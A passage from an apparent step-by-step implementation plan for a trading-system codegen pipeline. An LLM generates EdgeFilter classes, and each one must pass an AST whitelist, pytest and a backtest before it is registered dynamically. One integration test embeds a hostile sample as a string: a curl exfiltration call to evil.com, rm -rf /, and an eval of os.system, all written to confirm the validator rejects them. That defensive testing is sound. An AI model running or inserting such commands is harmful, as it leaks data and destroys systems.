        self._max_wr_degradation = max_win_rate_degradation
        self._mini_bt_bars = mini_backtest_bars

    def run(
        self,
        filter_code: str,
        test_code: str,
        filter_name: str,
        filter_class_name: str,
        category: str = "entry",
        skip_backtest: bool = False,
    ) -> PipelineResult:
        """Execute the full 3-stage safety pipeline.

        Parameters
        ----------
        filter_code:
            Complete Python source for the EdgeFilter subclass.
        test_code:
            Complete Python source for the test class.
        filter_name:
            Registered name (e.g., 'high_adx_london').
        filter_class_name:
            Class name (e.g., 'HighADXLondonFilter').
        category:
            Edge category: 'entry', 'exit', or 'modifier'.
        skip_backtest:
            If True, skip stage 3 (useful for unit testing the pipeline).

        Returns
        -------
        PipelineResult with per-stage pass/fail and details.
        """
        result = PipelineResult(
            filter_name=filter_name,
            filter_class_name=filter_class_name,
        )

        # ---- Stage 1: AST Whitelist Validation ----
        logger.info("[Stage 1/3] AST validation for %s", filter_name)
        ast_result = validate_ast(filter_code)
        result.ast_result = ast_result
        result.ast_passed = ast_result.is_valid

        if not ast_result.is_valid:
            result.failed_stage = "ast_validation"
            logger.warning(
                "AST validation FAILED for %s: %s",
                filter_name, "; ".join(ast_result.violations),
            )
            return result

        logger.info("[Stage 1/3] AST validation PASSED for %s", filter_name)

        # ---- Write files to disk for pytest and backtest ----
        # Ensure output directory exists
        self._output_dir.mkdir(parents=True, exist_ok=True)

        filter_file = self._output_dir / f"{filter_name}.py"
        filter_file.write_text(filter_code, encoding="utf-8")
        result.filter_file = str(filter_file)

        # Ensure __init__.py exists in generated dir
        init_file = self._output_dir / "__init__.py"
        if not init_file.exists():
            init_file.write_text(
                '"""Auto-generated EdgeFilter modules."""\n',
                encoding="utf-8",
            )

        # Write test file to a temp directory
        test_dir = Path(tempfile.mkdtemp(prefix="edge_test_"))
        test_file = test_dir / f"test_generated_{filter_name}.py"
        test_file.write_text(test_code, encoding="utf-8")
        result.test_file = str(test_file)

        # ---- Stage 2: Pytest Execution ----
        logger.info("[Stage 2/3] Pytest execution for %s", filter_name)
        pytest_result = run_generated_tests(
            str(test_file),
            timeout=self._test_timeout,
            min_tests=self._min_tests,
        )
        result.pytest_result = pytest_result
        result.pytest_passed = pytest_result.passed

        if not pytest_result.passed:
            result.failed_stage = "pytest_execution"
            logger.warning(
                "Pytest FAILED for %s: %s (passed=%d, failed=%d, errors=%d)",
                filter_name, pytest_result.error,
                pytest_result.num_passed, pytest_result.num_failed, pytest_result.num_errors,
            )
            # Clean up the filter file since it failed validation
            filter_file.unlink(missing_ok=True)
            return result

        logger.info(
            "[Stage 2/3] Pytest PASSED for %s (%d/%d tests)",
            filter_name, pytest_result.num_passed, pytest_result.num_collected,
        )

        # ---- Stage 3: Mini-Backtest Validation ----
        if skip_backtest:
            logger.info("[Stage 3/3] Backtest SKIPPED for %s", filter_name)
            result.backtest_passed = True
            result.passed = True
            return result

        logger.info("[Stage 3/3] Mini-backtest validation for %s", filter_name)
        bt_result = validate_with_backtest(
            filter_code=filter_code,
            filter_name=filter_name,
            filter_class_name=filter_class_name,
            category=category,
            max_win_rate_degradation=self._max_wr_degradation,
            n_bars=self._mini_bt_bars,
        )
        result.backtest_result = bt_result
        result.backtest_passed = bt_result.passed

        if not bt_result.passed:
            result.failed_stage = "backtest_validation"
            logger.warning(
                "Backtest validation FAILED for %s: %s", filter_name, bt_result.reason,
            )
            # Clean up the filter file since it failed validation
            filter_file.unlink(missing_ok=True)
            return result

        logger.info("[Stage 3/3] Backtest validation PASSED for %s: %s", filter_name, bt_result.reason)
        result.passed = True
        return result
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_safety_pipeline.py -v`
Expected: All 4 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/discovery/codegen/safety_pipeline.py tests/test_safety_pipeline.py
git commit -m "feat: add 3-stage safety pipeline orchestrator (Task 6)"
```

---

### Task 7: Dynamic EdgeFilter Registration

**Files:**
- Create: `src/discovery/codegen/registry.py`
- Create: `src/edges/generated/__init__.py`
- Test: `tests/test_codegen_registry.py`

- [ ] **Step 1: Write failing tests for registry**

```python
# tests/test_codegen_registry.py
"""Tests for dynamic EdgeFilter registration into EdgeManager._REGISTRY."""

from unittest.mock import patch
from pathlib import Path

import pytest


class TestDynamicRegistry:
    def _make_filter_code(self, name: str, class_name: str) -> str:
        return f'''
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult


class {class_name}(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("{name}", config)
        params = config.get("params", {{}})
        self._threshold = float(params.get("threshold", 30.0))

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()
        if context.adx >= self._threshold:
            return EdgeResult(allowed=True, edge_name=self.name, reason="OK")
        return EdgeResult(allowed=False, edge_name=self.name, reason="blocked")
'''

    def test_register_filter_adds_to_registry(self):
        from src.discovery.codegen.registry import register_filter
        from src.edges.manager import _REGISTRY

        name = "test_dynamic_adx_001"
        code = self._make_filter_code(name, "TestDynamicADXFilter001")

        original_keys = set(_REGISTRY.keys())
        try:
            register_filter(
                filter_name=name,
                filter_class_name="TestDynamicADXFilter001",
                filter_code=code,
                category="entry",
            )
            assert name in _REGISTRY
            cls, cat = _REGISTRY[name]
            assert cls.__name__ == "TestDynamicADXFilter001"
            assert cat == "entry"
        finally:
            _REGISTRY.pop(name, None)

    def test_registered_filter_can_be_instantiated(self):
        from src.discovery.codegen.registry import register_filter
        from src.edges.manager import _REGISTRY
        from src.edges.base import EdgeContext, EdgeResult

        name = "test_dynamic_adx_002"
        code = self._make_filter_code(name, "TestDynamicADXFilter002")

        try:
            register_filter(
                filter_name=name,
                filter_class_name="TestDynamicADXFilter002",
                filter_code=code,
                category="entry",
            )
            cls, _ = _REGISTRY[name]
            instance = cls({"enabled": True, "params": {"threshold": 25.0}})
            assert instance.name == name
            assert instance.enabled is True
        finally:
            _REGISTRY.pop(name, None)

    def test_unregister_filter_removes_from_registry(self):
        from src.discovery.codegen.registry import register_filter, unregister_filter
        from src.edges.manager import _REGISTRY

        name = "test_dynamic_adx_003"
        code = self._make_filter_code(name, "TestDynamicADXFilter003")

        try:
            register_filter(
                filter_name=name,
                filter_class_name="TestDynamicADXFilter003",
                filter_code=code,
                category="entry",
            )
            assert name in _REGISTRY
            unregister_filter(name)
            assert name not in _REGISTRY
        finally:
            _REGISTRY.pop(name, None)

    def test_list_generated_filters(self):
        from src.discovery.codegen.registry import register_filter, list_generated_filters
        from src.edges.manager import _REGISTRY

        name = "test_dynamic_adx_004"
        code = self._make_filter_code(name, "TestDynamicADXFilter004")

        try:
            register_filter(
                filter_name=name,
                filter_class_name="TestDynamicADXFilter004",
                filter_code=code,
                category="entry",
            )
            generated = list_generated_filters()
            assert name in generated
        finally:
            _REGISTRY.pop(name, None)

    def test_persist_and_load_from_disk(self, tmp_path):
        from src.discovery.codegen.registry import (
            register_filter,
            save_registry_manifest,
            load_generated_filters,
        )
        from src.edges.manager import _REGISTRY

        name = "test_dynamic_adx_005"
        code = self._make_filter_code(name, "TestDynamicADXFilter005")

        gen_dir = tmp_path / "generated"
        gen_dir.mkdir()

        try:
            # Write filter file
            filter_file = gen_dir / f"{name}.py"
            filter_file.write_text(code, encoding="utf-8")

            # Register
            register_filter(
                filter_name=name,
                filter_class_name="TestDynamicADXFilter005",
                filter_code=code,
                category="entry",
            )

            # Save manifest
            manifest_path = save_registry_manifest(str(gen_dir))
            assert Path(manifest_path).exists()

            # Unregister and reload
            _REGISTRY.pop(name, None)
            assert name not in _REGISTRY

            load_generated_filters(str(gen_dir))
            assert name in _REGISTRY
        finally:
            _REGISTRY.pop(name, None)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_codegen_registry.py -v`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Implement registry and generated package init**

```python
# src/edges/generated/__init__.py
"""Auto-generated EdgeFilter modules.

This package contains EdgeFilter subclasses created by the Creative
Pattern Discovery Agent's code generation pipeline. Each module has
passed the 3-stage safety pipeline (AST + pytest + backtest) before
being written here.

Filters are auto-registered into EdgeManager._REGISTRY at startup
via the registry manifest.
"""
```

```python
# src/discovery/codegen/registry.py
"""Dynamic EdgeFilter registration into EdgeManager._REGISTRY.

Provides runtime registration of generated EdgeFilter subclasses so
they participate in the edge pipeline without manual code changes.
Also handles persistence via a JSON manifest for reload across restarts.
"""

from __future__ import annotations

import importlib
import json
import logging
import sys
import types
from pathlib import Path
from typing import Any, Dict, List, Optional, Set

from src.edges.base import EdgeFilter

logger = logging.getLogger(__name__)

# Track which filters were dynamically registered (vs built-in)
_GENERATED_FILTER_NAMES: Set[str] = set()


def register_filter(
    filter_name: str,
    filter_class_name: str,
    filter_code: str,
    category: str = "entry",
) -> None:
    """Dynamically register a generated EdgeFilter into _REGISTRY.

    Compiles the source code, extracts the class, and adds it to
    EdgeManager's _REGISTRY dict.

    Parameters
    ----------
    filter_name:
        The registered name (e.g., 'high_adx_london').
    filter_class_name:
        The class name (e.g., 'HighADXLondonFilter').
    filter_code:
        Complete Python source for the EdgeFilter module.
    category:
        Edge category: 'entry', 'exit', or 'modifier'.

    Raises
    ------
    ValueError:
        If the class cannot be found in the compiled code.
    """
    from src.edges.manager import _REGISTRY

    # Compile and execute the code in an isolated module
    module_name = f"src.edges.generated.{filter_name}"
    module = types.ModuleType(module_name)
    module.__file__ = f"<generated:{filter_name}>"

    try:
        compiled = compile(filter_code, module.__file__, "exec")
        exec(compiled, module.__dict__)
    except Exception as exc:
        raise ValueError(f"Failed to compile generated code for {filter_name}: {exc}") from exc

    # Extract the filter class
    filter_cls = getattr(module, filter_class_name, None)
    if filter_cls is None:
        raise ValueError(
            f"Class '{filter_class_name}' not found in generated code for {filter_name}"
        )

    # Verify it's an EdgeFilter subclass
    if not (isinstance(filter_cls, type) and issubclass(filter_cls, EdgeFilter)):
        raise ValueError(
            f"'{filter_class_name}' is not an EdgeFilter subclass"
        )

    # Register in _REGISTRY
    _REGISTRY[filter_name] = (filter_cls, category)
    _GENERATED_FILTER_NAMES.add(filter_name)

    # Also register the module in sys.modules so imports work
    sys.modules[module_name] = module

    logger.info(
        "Registered generated EdgeFilter: %s (%s) as '%s'",
        filter_class_name, category, filter_name,
    )


def unregister_filter(filter_name: str) -> None:
    """Remove a generated filter from _REGISTRY.

    Parameters
    ----------
    filter_name:
        The registered name to remove.
    """
    from src.edges.manager import _REGISTRY

    _REGISTRY.pop(filter_name, None)
    _GENERATED_FILTER_NAMES.discard(filter_name)

    module_name = f"src.edges.generated.{filter_name}"
    sys.modules.pop(module_name, None)

    logger.info("Unregistered generated EdgeFilter: %s", filter_name)


def list_generated_filters() -> List[str]:
    """Return names of all dynamically registered generated filters."""
    return sorted(_GENERATED_FILTER_NAMES)


def save_registry_manifest(generated_dir: str) -> str:
    """Save a JSON manifest of all generated filters for reload.

    The manifest records filter_name, class_name, category, and the
    source file path so filters can be reloaded on next startup.

    Parameters
    ----------
    generated_dir:
        Directory containing generated filter .py files.

    Returns
    -------
    Path to the saved manifest.json file.
    """
    from src.edges.manager import _REGISTRY

    manifest: List[Dict[str, str]] = []
    gen_dir = Path(generated_dir)

    for name in sorted(_GENERATED_FILTER_NAMES):
        if name in _REGISTRY:
            cls, category = _REGISTRY[name]
            source_file = gen_dir / f"{name}.py"
            manifest.append({
                "filter_name": name,
                "class_name": cls.__name__,
                "category": category,
                "source_file": str(source_file),
            })

    manifest_path = gen_dir / "manifest.json"
    manifest_path.write_text(
        json.dumps(manifest, indent=2),
        encoding="utf-8",
    )
    logger.info("Saved registry manifest with %d filters to %s", len(manifest), manifest_path)
    return str(manifest_path)


def load_generated_filters(generated_dir: str) -> int:
    """Load and register all generated filters from the manifest.

    Called at startup to restore previously validated filters.

    Parameters
    ----------
    generated_dir:
        Directory containing generated filter .py files and manifest.json.

    Returns
    -------
    Number of filters successfully loaded.
    """
    gen_dir = Path(generated_dir)
    manifest_path = gen_dir / "manifest.json"

    if not manifest_path.exists():
        logger.debug("No manifest.json found in %s — no generated filters to load", gen_dir)
        return 0

    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    loaded = 0

    for entry in manifest:
        filter_name = entry["filter_name"]
        class_name = entry["class_name"]
        category = entry["category"]
        source_file = Path(entry["source_file"])

        if not source_file.exists():
            logger.warning("Source file missing for %s: %s", filter_name, source_file)
            continue

        try:
            filter_code = source_file.read_text(encoding="utf-8")
            register_filter(
                filter_name=filter_name,
                filter_class_name=class_name,
                filter_code=filter_code,
                category=category,
            )
            loaded += 1
        except Exception as exc:
            logger.warning("Failed to load generated filter %s: %s", filter_name, exc)

    logger.info("Loaded %d/%d generated filters from manifest", loaded, len(manifest))
    return loaded
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_codegen_registry.py -v`
Expected: All 5 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/edges/generated/__init__.py src/discovery/codegen/registry.py tests/test_codegen_registry.py
git commit -m "feat: add dynamic EdgeFilter registration with manifest persistence (Task 7)"
```

---

### Task 8: Integration Test — Full Codegen Cycle

**Files:**
- Test: `tests/test_codegen_integration.py`

- [ ] **Step 1: Write integration test**

```python
# tests/test_codegen_integration.py
"""Integration test: full codegen pipeline from hypothesis to registration."""

import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest


class TestFullCodegenCycle:
    def _make_hypothesis(self) -> dict:
        """Build a realistic hypothesis from Phase 1 discovery."""
        return {
            "id": "hyp_int_001",
            "description": "ADX > 35 during London session improves SSS win rate by 15%",
            "evidence": {
                "feature_a": "adx_value",
                "feature_b": "sess_london",
                "condition": "adx_value>=0.60 AND sess_london>=0.50",
                "quadrant_win_rate": 0.52,
                "baseline_win_rate": 0.37,
                "lift": 1.41,
                "n_trades": 35,
            },
            "strategy": "sss",
            "filter_spec": {
                "name": "adx_london_session",
                "class_name": "ADXLondonSessionFilter",
                "category": "entry",
                "description": "Require ADX >= 35 during London/overlap sessions",
                "params": {
                    "adx_threshold": {"type": "float", "default": 35.0},
                    "required_sessions": {"type": "str", "default": "'london,overlap'"},
                },
                "logic_description": (
                    "Allow trades when ADX >= adx_threshold AND session is in "
                    "required_sessions. Block all other entries."
                ),
            },
        }

    def _make_llm_response(self) -> str:
        """Simulate a Claude Code CLI response with filter + test code."""
        return '''Here's the implementation:

```python
# FILE: src/edges/generated/adx_london_session.py
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult


class ADXLondonSessionFilter(EdgeFilter):
    """Require ADX >= threshold during London/overlap sessions."""

    def __init__(self, config: dict) -> None:
        super().__init__("adx_london_session", config)
        params = config.get("params", {})
        self._adx_threshold = float(params.get("adx_threshold", 35.0))
        sessions_str = str(params.get("required_sessions", "london,overlap"))
        self._required_sessions = [s.strip() for s in sessions_str.split(",")]

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        if not self.enabled:
            return self._disabled_result()

        in_session = context.session in self._required_sessions
        adx_ok = context.adx >= self._adx_threshold

        if not in_session:
            return EdgeResult(
                allowed=True,
                edge_name=self.name,
                reason=f"Session {context.session} not targeted — filter inactive",
            )

        if adx_ok:
            return EdgeResult(
                allowed=True,
                edge_name=self.name,
                reason=f"ADX {context.adx:.1f} >= {self._adx_threshold:.0f} in {context.session}",
            )

        return EdgeResult(
            allowed=False,
            edge_name=self.name,
            reason=(
                f"ADX {context.adx:.1f} < {self._adx_threshold:.0f} "
                f"in {context.session} — weak trend"
            ),
        )
```

```python
# FILE: tests/test_generated_adx_london_session.py
from datetime import datetime, timezone
import pytest
from src.edges.base import EdgeContext, EdgeResult


def _ctx(**kw):
    defaults = dict(
        timestamp=datetime(2024, 6, 15, 10, 0, tzinfo=timezone.utc),
        day_of_week=5, close_price=2350.0, high_price=2355.0,
        low_price=2345.0, spread=15.0, session="london",
        adx=30.0, atr=5.0,
    )
    defaults.update(kw)
    return EdgeContext(**defaults)


class TestADXLondonSessionFilter:
    def _make_filter(self, **kw):
        from src.edges.generated.adx_london_session import ADXLondonSessionFilter
        params = {"adx_threshold": 35.0, "required_sessions": "london,overlap"}
        params.update(kw)
        return ADXLondonSessionFilter({"enabled": True, "params": params})

    def test_allows_when_condition_met(self):
        f = self._make_filter()
        result = f.should_allow(_ctx(adx=40.0, session="london"))
        assert result.allowed is True

    def test_blocks_when_condition_violated(self):
        f = self._make_filter()
        result = f.should_allow(_ctx(adx=20.0, session="london"))
        assert result.allowed is False

    def test_disabled_passes_through(self):
        from src.edges.generated.adx_london_session import ADXLondonSessionFilter
        f = ADXLondonSessionFilter({"enabled": False, "params": {}})
        result = f.should_allow(_ctx())
        assert result.allowed is True

    def test_non_target_session_passes(self):
        f = self._make_filter()
        result = f.should_allow(_ctx(adx=20.0, session="asian"))
        assert result.allowed is True
```
'''

    def test_end_to_end_codegen_with_mocked_llm(self):
        """Full cycle: hypothesis -> LLM -> AST -> pytest -> register."""
        from src.discovery.codegen.llm_generator import generate_edge_filter, GeneratedCode
        from src.discovery.codegen.safety_pipeline import SafetyPipeline
        from src.discovery.codegen.registry import (
            register_filter, unregister_filter, list_generated_filters,
        )
        from src.edges.manager import _REGISTRY

        hypothesis = self._make_hypothesis()
        llm_response = self._make_llm_response()

        # Mock the LLM call
        mock_result = MagicMock()
        mock_result.stdout = llm_response
        mock_result.returncode = 0

        with patch("subprocess.run", return_value=mock_result):
            generated = generate_edge_filter(hypothesis)

        assert generated.filter_code is not None
        assert generated.test_code is not None
        assert "ADXLondonSessionFilter" in generated.filter_code

        # Run AST validation
        from src.discovery.codegen.ast_validator import validate_ast
        ast_result = validate_ast(generated.filter_code)
        assert ast_result.is_valid is True
        assert ast_result.class_name == "ADXLondonSessionFilter"

        # Register the filter
        filter_name = "adx_london_session"
        try:
            register_filter(
                filter_name=filter_name,
                filter_class_name="ADXLondonSessionFilter",
                filter_code=generated.filter_code,
                category="entry",
            )
            assert filter_name in _REGISTRY
            assert filter_name in list_generated_filters()

            # Verify the filter actually works
            cls, category = _REGISTRY[filter_name]
            instance = cls({"enabled": True, "params": {"adx_threshold": 35.0}})
            assert instance.name == filter_name

        finally:
            unregister_filter(filter_name)
            assert filter_name not in _REGISTRY

    def test_ast_rejects_llm_generated_dangerous_code(self):
        """Ensure the safety pipeline catches bad LLM output."""
        from src.discovery.codegen.ast_validator import validate_ast

        # Simulate LLM generating dangerous code
        bad_code = '''
import os
import subprocess
from src.edges.base import EdgeFilter, EdgeContext, EdgeResult

class DangerousFilter(EdgeFilter):
    def __init__(self, config: dict) -> None:
        super().__init__("dangerous", config)

    def should_allow(self, context: EdgeContext) -> EdgeResult:
        # Exfiltrate data
        os.system("curl http://evil.com/steal?data=" + str(context.close_price))
        subprocess.run(["rm", "-rf", "/"])
        result = eval("__import__('os').system('whoami')")
        return EdgeResult(allowed=True, edge_name=self.name, reason="pwned")
'''
        ast_result = validate_ast(bad_code)
        assert ast_result.is_valid is False
        assert len(ast_result.violations) >= 3  # os, subprocess, eval

    def test_template_renders_valid_skeleton(self):
        """Templates produce AST-valid code skeletons."""
        from src.discovery.codegen.template_renderer import render_filter_template
        from src.discovery.codegen.ast_validator import validate_ast

        hypothesis = self._make_hypothesis()
        skeleton = render_filter_template(hypothesis["filter_spec"])

        # The skeleton should pass AST validation (even though logic is NotImplementedError)
        ast_result = validate_ast(skeleton)
        assert ast_result.is_valid is True
        assert ast_result.class_name == "ADXLondonSessionFilter"
        assert ast_result.has_should_allow is True
```

- [ ] **Step 2: Run full test suite**

Run: `pytest tests/test_ast_validator.py tests/test_template_renderer.py tests/test_llm_generator.py tests/test_test_executor.py tests/test_backtest_validator.py tests/test_safety_pipeline.py tests/test_codegen_registry.py tests/test_codegen_integration.py -v`
Expected: All tests PASS

- [ ] **Step 3: Commit**

```bash
git add tests/test_codegen_integration.py
git commit -m "feat: add codegen integration tests (Task 8)"
```

---

### Task 9: Update Codegen Package Exports + Discovery Runner Integration

**Files:**
- Modify: `src/discovery/codegen/__init__.py`
- Test: verify existing tests still pass

- [ ] **Step 1: Update package exports**

```python
# src/discovery/codegen/__init__.py
"""LLM Code Generation + Safety Pipeline for EdgeFilter discovery.

Generates new EdgeFilter subclasses from discovery findings using Claude
Code CLI, validates through AST whitelist + pytest + mini-backtest, and
auto-registers passing filters into EdgeManager._REGISTRY.
"""

from src.discovery.codegen.ast_validator import validate_ast, ASTValidationResult
from src.discovery.codegen.llm_generator import generate_edge_filter, GeneratedCode
from src.discovery.codegen.template_renderer import (
    render_codegen_prompt,
    render_filter_template,
    render_test_template,
)
from src.discovery.codegen.safety_pipeline import SafetyPipeline, PipelineResult
from src.discovery.codegen.registry import (
    register_filter,
    unregister_filter,
    list_generated_filters,
    save_registry_manifest,
    load_generated_filters,
)

__all__ = [
    "validate_ast",
    "ASTValidationResult",
    "generate_edge_filter",
    "GeneratedCode",
    "render_codegen_prompt",
    "render_filter_template",
    "render_test_template",
    "SafetyPipeline",
    "PipelineResult",
    "register_filter",
    "unregister_filter",
    "list_generated_filters",
    "save_registry_manifest",
    "load_generated_filters",
]
```

- [ ] **Step 2: Run full test suite to confirm nothing broke**

Run: `pytest tests/test_ast_validator.py tests/test_template_renderer.py tests/test_llm_generator.py tests/test_test_executor.py tests/test_backtest_validator.py tests/test_safety_pipeline.py tests/test_codegen_registry.py tests/test_codegen_integration.py -v`
Expected: All tests PASS

- [ ] **Step 3: Commit**

```bash
git add src/discovery/codegen/__init__.py
git commit -m "feat: update codegen package exports for Phase 4 (Task 9)"
```

---

## Summary

| Task | Component | Files | Tests |
|------|-----------|-------|-------|
| 1 | AST whitelist validator | `ast_validator.py` | 12 tests |
| 2 | Jinja2 template system | `template_renderer.py`, `edge_filter.py.j2`, `edge_test.py.j2` | 5 tests |
| 3 | LLM code generator | `llm_generator.py` | 6 tests |
| 4 | Subprocess test executor | `test_executor.py` | 5 tests |
| 5 | Mini-backtest validator | `backtest_validator.py` | 5 tests |
| 6 | Safety pipeline orchestrator | `safety_pipeline.py` | 4 tests |
| 7 | Dynamic registry | `registry.py`, `generated/__init__.py` | 5 tests |
| 8 | Integration test | -- | 3 tests |
| 9 | Package exports | `codegen/__init__.py` | 0 (re-run) |

**Total: 9 tasks, 45 tests, 9 new source files, 2 Jinja2 templates.**

Phase 5 (Full Orchestrator) will tie Phases 1-4 together into the 30-day rolling challenge loop.
